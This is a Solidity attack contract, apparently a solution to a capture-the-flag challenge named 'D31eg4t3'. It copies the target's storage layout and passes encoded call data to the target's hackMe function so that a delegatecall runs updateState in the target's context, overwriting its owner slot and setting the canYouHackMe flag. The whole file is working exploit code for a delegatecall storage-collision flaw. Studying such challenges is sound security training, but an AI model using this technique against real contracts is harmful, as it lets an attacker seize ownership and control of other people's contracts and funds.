// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./D31eg4t3.sol";

contract D31eg4t3Attack {
  uint a = 12345;
  uint8 b = 32;
  string private d;
  uint32 private c;
  string private mot;
  address public owner;

  mapping (address => bool) public canYouHackMe;

  D31eg4t3 target;

  constructor(address _target) {
    target = D31eg4t3(_target);
  }

  function attack() external {
    bytes memory data = abi.encodeWithSelector(this.updateState.selector, address(this));
    target.hackMe(data);
  }

  function updateState(address _owner) external {
    owner = _owner;
    canYouHackMe[_owner] = true;
  }
}
